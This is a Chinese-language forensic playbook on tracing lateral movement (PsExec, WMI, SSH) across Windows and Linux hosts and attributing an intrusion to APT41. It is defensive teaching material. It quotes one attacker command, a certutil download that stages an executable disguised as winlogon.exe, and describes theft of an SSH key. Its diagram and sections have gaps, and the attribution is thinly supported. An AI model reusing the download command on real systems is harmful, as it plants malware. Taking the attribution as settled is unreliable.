# 實戰手冊 28.3：跨主機橫向移動鏈路拓撲重組、多源跡證融合與攻擊組織歸因

## 案發現場破題

在進階企業級入侵事件中，攻擊者鮮少將活動侷限於初始突破口（Initial Foothold）。一旦取得內部主機控制權，攻擊者會迅速發起內部偵察，並利用企業內部信任關係（Domain Trust、管理者憑證共用、未隔離網段）在多台伺服器間進行「跳躍式橫向移動（Lateral Movement Pivot）」。

當事件響應（IR）團隊介入調查時，往往面臨主機日誌片段化、攻擊軌跡斷續、不同資產時序錯位的嚴峻挑戰。若僅孤立檢視單一端點，極易誤判攻擊規模或遺漏隱蔽後門。

本實戰手冊聚焦於「多主機、跨網段、多架構（Windows AD + Linux 伺服器群 + 網路防火牆）」的綜合取證。透過融合 Windows EVTX（4624, 4672, 7045, 4688）、Sysmon、Linux Auth Log、SSH 連線紀錄與周界 NetFlow/PCAP 封包，精準重組攻擊者在內部網路中如蛛網般延展的橫向跳躍拓撲，並基於 MITRE ATT&CK 戰術特徵與 CTI 威脅情資，完成對特定 APT 威脅組織（如 APT29, APT41, Lazarus）的科學化鑑識歸因（Attribution）。

```
跨主機橫向移動鏈路拓撲與多源跡證圖譜 (Multi-Host Pivot Graph)：

[外部 C2 節點 (198.51.100.77)]
       │ (HTTPS C2 Beaconing)
       ▼
[跳板主機 A: DMZ Web 伺服器 (192.168.10.20)]
       │ (跡證: Sysmon ID 3 外部連線 / W3WP 衍生 CMD)
       │ (橫向手段: T1021.002 SMB/RPC + PsExec 服務安裝)
       ▼
[跳板主機 B: 內部檔案伺服器 (192.168.20.15)]
       │ (跡證: Event 4624 Type 3 + Event 7045 PSEXESVC 服務)
       │ (橫向手段: T1021.006 WMI Win32_Process.Create)
       ▼

       │ (跡證: Sysmon ID 1 wmic.exe 呼叫 / Event 4648 明文憑證使用)

       ▼

```

## 第一動：多源日誌交叉印證與橫向技術指紋庫

在面對跨主機入侵時，藍隊必須建立標準橫向移動指紋清單，以自動化過濾常見橫向手段：

### 1.1 常見橫向移動協定與端點日誌特徵矩陣
| 橫向移動技術 (TTP) | 傳輸協定與埠號 | 來源端日誌 (Source) | 目標端日誌 (Target) | 鑑識關鍵欄位 |
| :--- | :--- | :--- | :--- | :--- |
| **PsExec / SMB Exec** | SMB (TCP 445) | Sysmon ID 3 (連線 445) | Security 4624 (Type 3) + 7045 / 7036 (服務註冊) | 服務名稱常態為 PSEXESVC 或 8 位隨機英數 |
| **WMI Process Create** | RPC (TCP 135) + 高埠 | Sysmon ID 1 (wmic /node) | Security 4624 (Type 3) + Sysmon ID 1 (WmiPrvSE.exe 衍生) | 母行程必為 C:\Windows\System32\wbem\WmiPrvSE.exe |
| **WinRM / PowerShell** | HTTP/S (TCP 5985/5986) | PowerShell ID 4104 | Security 4624 (Type 3) + wsmprovhost.exe | 母行程為 svchost.exe -k DcomLaunch |
| **RDP 遠端桌面** | RDP (TCP 3389) | Sysmon ID 3 (連線 3389) | Security 4624 (Type 10/7) + TerminalServices 1149 | 記錄客戶端電腦名稱與來源真實 IP |
| **SSH 跨平台跳躍** | SSH (TCP 22) | Sysmon ID 3 / Linux bash | /var/log/auth.log (Accepted password/publickey) | 登入公鑰指紋 (Fingerprint) 與來源 IP |

## 第二動：Windows 網域環境橫向移動鏈路深度還原

### 2.1 偵測目標端 PsExec 服務註冊與管道通訊
當攻擊者使用 PsExec 橫向至檔案伺服器（`192.168.20.15`）時，系統日誌必留下痕跡：

```powershell
# 1. 檢索 Event ID 7045 (A service was installed in the system)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | Where-Object {
    $_.Properties[0].Value -match "PSEXESVC" -or 
    $_.Properties[1].Value -match "admin\$\\"
} | Select-Object TimeCreated, @{N='ServiceName';E={$_.Properties[0].Value}}, @{N='ImagePath';E={$_.Properties[1].Value}}

# 2. 關聯 Security 日誌 Event ID 4624 Logon Type 3 (Network Logon)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} | Where-Object {
    $_.Properties[8].Value -eq 3 -and $_.Properties[18].Value -eq "192.168.10.20"
} | Select-Object TimeCreated, @{N='TargetUser';E={$_.Properties[5].Value}}, @{N='SourceIp';E={$_.Properties[18].Value}}
```
**分析結論**：`192.168.10.20`（DMZ Web）於 `09:15:32` 使用網域管理者帳號 `CORP\svc_backup` 透過網路登入 `192.168.20.15`，並安裝臨時遠端控制服務。

### 2.2 追蹤 WMI 跨主機無檔案執行特徵
攻擊者自檔案伺服器跳向 Bastion 主機（`192.168.20.80`）改用 WMI 避免產生服務日誌：
```powershell
# 在目標端 Bastion 檢驗 Sysmon Event ID 1: WmiPrvSE 衍生子行程
Get-WinEvent -Path "C:\Evidence\bastion_sysmon.evtx" -FilterXPath @"
*[System[(EventID=1)]] and 
*[EventData[Data[@Name='ParentImage'] and contains(., 'WmiPrvSE.exe')]]
"@ | Select-Object TimeCreated, @{N='Process';E={$_.Properties[4].Value}}, @{N='CommandLine';E={$_.Properties[10].Value}}
```
**關鍵跡證**：`WmiPrvSE.exe` 於 `09:30:10` 啟動 `cmd.exe /c certutil.exe -urlcache -split -f http://192.168.20.15/stage2.exe C:\PerfLogs\winlogon.exe`。

## 第三動：跨架構跳躍——從 Windows Bastion 到 Linux 核心主機

### 3.1 提取 Windows 端點之 SSH 私鑰快取與設定檔
在 Bastion 主機鑑識過程中，檢查使用者目錄下是否有私鑰殘留或動態載入之 `pageant.exe` / `ssh-agent`：
```powershell
# 檢索 PuTTY Session 註冊表與 OpenSSH known_hosts
Get-ChildItem -Path "C:\Users\*\.ssh\known_hosts", "C:\Users\*\.ssh\id_rsa" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" | Select-Object HostName, UserName, PublicKeyFile
```
**鑑識發現**：發現攻擊者直接取用管理員存放在桌面未加密的 `core_root.pem`。

### 3.2 Linux 目標端 Auth 日誌與階段還原
檢索核心 Linux 資料庫伺服器（`192.168.30.50`）上的認證日誌：
```bash
# 1. 檢索來源於 Bastion (192.168.20.80) 的 SSH 登入行為
grep "Accepted publickey" /var/log/auth.log | grep "192.168.20.80"

# 輸出範例：
# May 08 09:45:22 db-core sshd[14201]: Accepted publickey for root from 192.168.20.80 port 49822 ssh2: RSA SHA256:4kJ98...

# 2. 追蹤該 Session 對應之 Bash 行程與命令執行
journalctl _COMM=sshd -o verbose | grep -B 5 -A 10 "14201"
```

## 第五動：威脅情資對比、TTP 特徵庫與攻擊組織科學歸因 (CTI Attribution)

### 5.1 威脅歸因分析三要素（The Attribution Diamond Model）
在完成橫向移動拓撲後，鑑識專家需依據行為特徵進行組織畫像（Adversary Profiling）：

| 鑑識指標維度 | 本案觀測特徵 | 關聯 APT 組織畫像 (CTI Mapping) |
| :--- | :--- | :--- |
| **基礎設施 (Infrastructure)** | 採用特定 ASN VPS，搭配 Fast-Flux DNS 與 HTTPS 隱蔽 C2 | 與 **APT41 (Barium / Double Dragon)** 歷史基礎設施重疊 |
| **武器庫與工具 (Capabilities)** | 自研 In-Memory 反彈後門、搭配 Certutil 落地與 PsExec 改名 | 符合 APT41 常用之武器庫特徵 |
| **戰術偏好 (TTP Preferences)** | 偏好 Pass-the-Hash 橫向移動，並以偷取之 SSH 憑證跨平台滲透 | 展現高度熟練之 Windows/Linux 混合環境雙棲作戰能力 |
| **行動時區 (Working Hours)** | 核心活動集中於 UTC+8 之 08:30 ~ 17:30，具備鮮明朝九晚五作息 | 判定為具備組織紀律之專案團隊，排除散戶或業餘勒索團體 |
